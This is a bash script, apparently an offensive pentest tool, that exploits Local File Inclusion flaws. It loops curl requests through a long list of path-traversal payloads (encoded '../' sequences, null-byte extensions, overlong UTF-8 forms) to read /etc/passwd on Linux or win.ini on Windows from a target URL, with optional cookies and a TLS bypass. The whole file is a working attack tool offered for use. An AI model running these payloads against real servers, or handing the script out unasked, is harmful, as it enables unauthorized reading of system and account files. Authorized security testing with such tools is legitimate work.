#!/bin/bash

#
# Tool to exploit Local File Inclusion (LFI) vulnerabilities.
# It attempts to retrieve files like /etc/passwd on Linux or win.ini on Windows.
# The idea is to test multiple payloads until the target file can be loaded.
#

set -euo pipefail

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
WHITE="\e[97m"
RESET="\e[0m"

usage(){
    echo -e "${CYAN}Use:${RESET} $0 -u URL_BASE [-P PREFIX] [-c \"cookie\"] [-k] [-s linux|windows]"
    echo -e "${YELLOW}-u URL_BASE${RESET}   Example: \"https://target/image?filename=\" (required)"
    echo -e "${YELLOW}-c cookie${RESET}     Optional cookie: \"name=value\" or \"a=b; c=d\""
    echo -e "${YELLOW}-P PREFIX${RESET}     Prefix to prepend to the payload (e.g., \"filename\", \"filename/\" or \"/filename/\").\n\t\tIt is not the file itself, but in many cases LFIs occur between directories or files. If this is your case, put it here."
    echo -e "${YELLOW}-k${RESET}            Ignore TLS verification (curl --insecure)"
    echo -e "${YELLOW}-s SO${RESET}         Force \"linux\" or \"windows\". Default: linux"
}

# defaults
SO="linux"
URL=""
PREFIX=""
COOKIE=""
INSEC=0

# parse args
while getopts ":u:P:c:ks:h" opt; do
  case $opt in
    u) URL="$OPTARG";;
    P) PREFIX="$OPTARG";;
    c) COOKIE="$OPTARG";;
    k) INSEC=1;;
    s) SO="$OPTARG";;
    h|*) usage; exit 1;;
  esac
done

if [ -z "$URL" ]; then
  echo -e "\n${RED}ERROR: -u BASE URL is required.${RESET}\n"
  usage
  exit 1
fi

# valid OS
if [[ "$SO" != "linux" && "$SO" != "windows" ]]; then
  echo -e "\n${RED}ERROR: -s must be 'linux' or 'windows'.${RESET}\n"
  usage
  exit 1
fi

# opciones curl comunes
curl_opts=(-s -L --max-time 15 -A "Mozilla/5.0 (LFI-Tester)")
[ "$INSEC" -eq 1 ] && curl_opts+=(-k)
[ -n "${COOKIE}" ] && curl_opts+=(-b "$COOKIE")

# Array con todos los payloads
payloads_linux=(
"/etc/passwd"
"etc/passwd"
"../etc/passwd"
"../../../../etc/passwd"
"../../../../../../etc/passwd"
"/../../../../../../etc/passwd"
"..%c0%afetc/passwd"
"..%c1%9cetc/passwd"
"..%e0%80%afetc/passwd"
"..%f0%80%80%afetc/passwd"
"..%252fetc/passwd"
"..%252f..%252f..%252fetc/passwd"
"..%255cetc/passwd"
"..%255..%255..%255etc/passwd"
"..%2e%2e%2fetc/passwd"
"..%2e%2e/etc/passwd"
"..%2e/etc/passwd"
"..%u2215etc/passwd"
"..%uEFC8etc/passwd"
"..%uff0e%uff0e%u2215etc/passwd"
"%2e%2e%2fetc/passwd"
"%252e%252e%252fetc/passwd"
"%2e%2e/etc/passwd"
"%2e/etc/passwd"
"%2e%2eetc/passwd"
"%5c%5cetc/passwd"
"/../../etc/passwd"
"....//etc/passwd"
"....\/etc/passwd"
"....////etc/passwd"
"....//....//....//etc/passwd"
"/%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd"
"/var/www/images/etc/passwd"
"/etc/passwd%00.png"
"/etc/passwd%00.jpg"
"/etc/passwd%00.jpeg"
"/etc/passwd%00.php"
"../../../etc/passwd%00.png"
"../../../etc/passwd%00.jpg"
"../../../etc/passwd%00.jpeg"
"../../../etc/passwd%00.php"
"../../../etc/passwd%00.png"
"../../../../../../etc/passwd%00.jpg"
"../../../../../../etc/passwd%00.jpeg"
"../../../../../../etc/passwd%00.php"
"/../../../../../../etc/passwd%00.jpg"
"/../../../../../../etc/passwd%00.jpeg"
"/../../../../../../etc/passwd%00.php"
"/../../../../etc/passwd%00.png"
"../%c0%af../%c0%af../%c0%afetc/passwd"
"../%c1%9c../%c1%9c../%c1%9cetc/passwd"
"..%5c..%5c..%5c..%5cetc/passwd"
"..%2e%2e%5c..%2e%2e%5cetc/passwd"
"..%2F..%2Fetc%2Fpasswd"
"..%5C..%5Cetc%5Cpasswd"
"..%2f..%2f..%2fetc%2fpasswd"
"%2e%2e%5c%2e%2e%5cetc%5cpasswd"
"%2e%2e/%2e%2e/etc/passwd"
"%252e%252e/%252e%252e/etc/passwd"
"..;/..;/etc/passwd"
"..%00/etc/passwd"
"..%00/../etc/passwd"
"..%2e/%2e./etc/passwd"
"/..%2f..%2fetc%2fpasswd"
"\..\..\etc\passwd"
"/./././../../etc/passwd"
"/%2e/%2e/etc/passwd"
"/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
"%2e%2e/%2e%2e/%2e%2e/etc/passwd"
"%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini"
"..%c1%1c..%c1%1cetc/passwd"
"..%uff0e%uff0e%u2215etc%u2215passwd"
"..././..././etc/passwd"
".../.../.../etc/passwd"
)

payloads_windows=(
"C:\\Windows\\win.ini"
"..\\Windows\\win.ini"
"..\\..\\Windows\\win.ini"
"..\\..\\..\\..\\Windows\\win.ini"
"..%5cWindows%5cwin.ini"
"..%5c..%5cWindows%5cwin.ini"
"..%5c..%5c..%5c..%5cWindows%5cwin.ini"
"..%2fWindows%2fwin.ini"
"..%2f..%2fWindows%2fwin.ini"
"..%2f..%2f..%2f..%2fWindows%2fwin.ini"
"../../Windows/win.ini"
"../../../Windows/win.ini"
"../../../../Windows/win.ini"
"..\\..\\..\\..\\..\\Windows\\win.ini"
"..%5c..%5c..%5c..%5c..%5cWindows%5cwin.ini"
"....\\Windows\\win.ini"
"....\\/Windows\\win.ini"
"....\\\\\\\\Windows\\win.ini"
"....\\....\\....\\Windows\\win.ini"
)

# choose payload
if [ "$SO" = "linux" ]; then
  payloads=("${payloads_linux[@]}")
else
  payloads=("${payloads_windows[@]}")
fi

# Simple function to clean HTML and decode minimally before grep
clean_and_decode(){
  printf '%s' "$1" \
    | sed 's/<pre[^>]*>/\n/gI; s/<[^>]*>//g' \
    | sed 's/&lt;/</g; s/&gt;/>/g; s/&amp;/\&/g' \
    | python3 -c "import sys,urllib.parse as u; print(u.unquote(sys.stdin.read()))"
}

# function that filters by OS
process_output(){
  local so="$1"; shift
  local data="$*"
  if [ "$so" = "linux" ]; then
    # /etc/passwd type lines
    printf '%s' "$data" | grep -E '^[^:]+:[^:]*:[0-9]+:[0-9]+:' || true
  else
    # patterns windows: sections, key=value, routes, hosts
    printf '%s' "$data" | grep -E '^\[[A-Za-z0-9_ ]+\]|^[A-Za-z0-9_.-]+=[^=]*$|\\Windows\\|/Windows/|^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[[:space:]]+[A-Za-z0-9._-]+' || true
  fi
}

echo -e "\n${CYAN}LFI Exploitation Tool:${RESET} Attempts to retrieve /etc/passwd (Linux) or win.ini (Windows) by testing multiple payloads.\n"


# iterate: for each relative payload we try (A) payload and (B) PREFIX+payload (if PREFIX exists)
for rel in "${payloads[@]}"; do
  # variant A: no prefix
  for variant in "${rel}" "${PREFIX}${rel}"; do
    # if PREFIX is empty second variant will be same to rel+"" -> avoid duplicates
    if [ -z "$PREFIX" ] && [ "$variant" = "$rel" ]; then
      :
    fi

    # if variant is empty (e.g. PREFIX empty + rel empty) skip
    [ -z "$variant" ] && continue

    # request
    #echo -e "\n>>> PAYLOAD: $variant"
    #echo "REQUEST: ${URL}${variant}"
    resp=$(curl "${curl_opts[@]}" "${URL}${variant}" 2>/dev/null || true)
    cleaned=$(clean_and_decode "$resp")
    cleaned=$(printf '%s' "$cleaned" | tr '\r' '\n')

    # show output
    matches=$(process_output "$SO" "$cleaned")
    if [ -n "$matches" ]; then
        echo -e "${YELLOW}---------------------------------------------------------\n\n${RESET}"
        echo -e "${MAGENTA}[->]PAYLOAD${RESET}: ${URL}${variant}\n"
        echo -e "${GREEN}[+]${RESET}POSSIBLE INTERESTING CONTENT DETECTED:\n\n"
        echo -e "${GREEN}$matches${RESET}\n"
    #else
      #echo "No detected. Preview (primeras 12 líneas):"
      #printf '%s\n' "$cleaned" | head -n 12
    fi
  done
done

echo -e "END."
